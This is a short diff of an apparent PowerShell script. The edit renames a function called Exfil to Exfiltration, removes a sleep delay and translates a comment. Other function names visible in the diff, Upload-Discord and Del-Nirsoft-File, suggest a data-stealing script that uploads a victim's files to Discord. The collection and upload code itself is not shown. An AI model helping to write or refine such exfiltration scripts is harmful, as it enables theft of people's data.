@@ -21,7 +21,7 @@ function Upload-Discord {
     }
 }
 
-function Exfil {
+function Exfiltration {
     # Get desktop path
     $desktop = [Environment]::GetFolderPath("Desktop")
 
@@ -115,8 +115,5 @@ function Del-Nirsoft-File {
   exit
 }
 
-# Délai de 15 secondes (ajustez selon vos besoins)
-Start-Sleep -Seconds 10
-
-# Appeler la fonction Exfil
-    Exfil
+# Call Exfiltration function
+    Exfiltration
